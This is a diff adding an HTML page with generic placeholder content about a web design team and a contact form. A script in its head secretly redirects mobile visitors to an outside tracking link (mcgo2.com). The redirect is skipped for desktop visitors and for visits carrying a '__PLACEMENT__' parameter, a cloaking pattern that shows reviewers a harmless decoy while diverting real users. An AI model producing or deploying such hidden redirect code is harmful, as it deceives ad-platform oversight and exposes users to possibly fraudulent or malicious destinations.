@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Random HTML Website</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #333;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    main {
+      padding: 20px;
+    }
+    footer {
+      background-color: #f2f2f2;
+      padding: 10px;
+      text-align: center;
+    }
+  </style>
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/2b563712-fe69-4179-9e2f-168dcbbd0547?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+  </script>
+</head>
+<body>
+  <header>
+    <h1>Welcome to my Random Website</h1>
+  </header>
+  <main>
+    <h2>About Us</h2>
+    <p>We are a team of creative individuals who love to build unique and interesting websites.</p>
+    <h2>Our Services</h2>
+    <ul>
+      <li>Web Design</li>
+      <li>Web Development</li>
+      <li>Search Engine Optimization</li>
+    </ul>
+    <h2>Contact Us</h2>
+    <form>
+      <label for="name">Name:</label>
+      <input type="text" id="name" name="name"><br><br>
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email"><br><br>
+      <label for="message">Message:</label>
+      <textarea id="message" name="message"></textarea><br><br>
+      <input type="submit" value="Submit">
+    </form>
+  </main>
+  <footer>
+    <p>&copy; 2023 Random Website. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+  </footer>
+</body>
+</html>
